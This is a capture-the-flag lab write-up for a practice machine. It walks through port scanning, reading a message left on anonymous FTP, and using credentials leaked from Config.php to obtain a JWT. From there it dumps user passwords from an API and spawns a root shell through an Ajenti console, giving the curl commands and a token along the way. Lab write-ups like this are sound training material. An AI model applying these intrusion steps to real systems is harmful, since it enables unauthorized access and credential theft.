![](./logo.png)

# USER

Running `nmap` we find an `ftp` endpoint with anon bind

With a message:

```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry
```

We have two other `http` endpoints:

```
3000: Returns JSON with a failed auth message (JWT)
8000: Ajenti console
```

`Config.php` endpoint is available with credentials:

```
root
Zk6heYCyv6ZE9Xcg
```

Working with JWT we have a `/login` endpoint

I attempted a 'none' attack on JWT, but no result

Using the credentials found from the `Config.php` file we can authenticate as admin:

```
curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://10.10.10.137:3000/login
```

That returns a token like:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDYzMjM2LCJleHAiOjE1NTkxNDk2MzZ9.TTmBKpRcZsJe83kweqmfxbt1sQVLXlbsSBHSBnK-1bI
```

Giving us a token that can be added to a request like:

```
Authorization: Bearer <TOKEN>
```

This can be used like so to query the `/users` endpoint
```
curl \
    --header "Content-Type: application/json" \
    --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDYzMjM2LCJleHAiOjE1NTkxNDk2MzZ9.TTmBKpRcZsJe83kweqmfxbt1sQVLXlbsSBHSBnK-1bI" \
    http://10.10.10.137:3000/users
```

Giving us:
```json
[
    {"ID":"1","name":"Admin","Role":"Superuser"},
    {"ID":"2","name":"Derry","Role":"Web Admin"},
    {"ID":"3","name":"Yuri","Role":"Beta Tester"},
    {"ID":"4","name":"Dory","Role":"Supporter"}
]
```

Requesting the endpoint for each user gives us a password for each user!

e.g.
```
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
```

The `/management` endpoint provides us with another `root:password` combination. This can be used for the `ajenti` endpoint. This application lets us spawn a management shell. 

This places us on the box as `root` to we can access the `user.txt` and `root.txt`

### Endpoints:
The `/management` endpoint was only found by `ZAP` because `Gobuster` filters out 401 results. Future note: Make sure to dirbust with two applications